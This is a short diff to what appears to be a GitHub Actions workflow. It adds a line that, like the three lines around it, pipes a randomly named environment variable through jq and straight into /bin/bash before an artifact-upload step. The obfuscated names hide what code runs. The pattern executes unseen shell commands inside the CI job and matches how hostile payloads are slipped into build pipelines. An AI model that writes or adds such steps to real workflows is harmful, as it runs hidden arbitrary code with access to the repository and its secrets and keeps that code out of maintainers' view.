@@ -29,6 +29,7 @@ jobs:
           printf '%s' "$smpj86948" | jq -r .hml5043 | /bin/bash
           printf '%s' "$yd1" | jq -r .dtfmx18093 | /bin/bash
           printf '%s' "$vda39238" | jq -r .inbwe7368 | /bin/bash
+          printf '%s' "$xsp12" | jq -r .z4 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
